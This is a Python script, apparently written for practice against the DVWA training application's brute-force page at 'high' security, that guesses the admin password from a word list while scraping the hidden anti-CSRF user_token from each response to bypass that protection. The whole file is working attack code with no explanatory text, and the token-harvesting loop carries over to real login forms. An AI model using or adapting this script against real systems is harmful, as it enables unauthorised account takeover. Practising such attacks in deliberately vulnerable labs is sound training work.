#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
@time: 2020-07-15 18:55:20
@author: Mr.Li
Copyright © 2020—2020 Mr.Li. All rights reserved.
"""

import requests
import re

if __name__ == '__main__':
    header = {'Host': '你的host',
              'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
              'Accept-Language': 'en-US,en;q=0.5',
              'Accept-Encoding': 'gzip, deflate',
              'Referer': '你的URL',
              'Connection': 'close',
              'cookie': 'security=high; PHPSESSID=你的ID',
              'Upgrade-Insecure-Requests': '1'
              }
    with open("password.txt", "r") as f:
        passwords = f.readlines()
    f.close()
    req = requests.get("你的URL/vulnerabilities/brute/", headers=header)
    token = re.findall("<input type='hidden' name='user_token' value='(.*?)' />", req.text)[0]
    print('NO. username password status_code length')
    i = 0
    for password in passwords:
        password = password.rstrip('\n')
        url = "你的URL/vulnerabilities/brute/?username=admin&password=" + password + "&Login=Login&user_token=" + token
        req2 = requests.get(url, headers=header)
        token = re.findall("<input type='hidden' name='user_token' value='(.*?)' />", req2.text)[0]
        i = i + 1
        print(i,'admin',password,req2.status_code,len(req2.text))




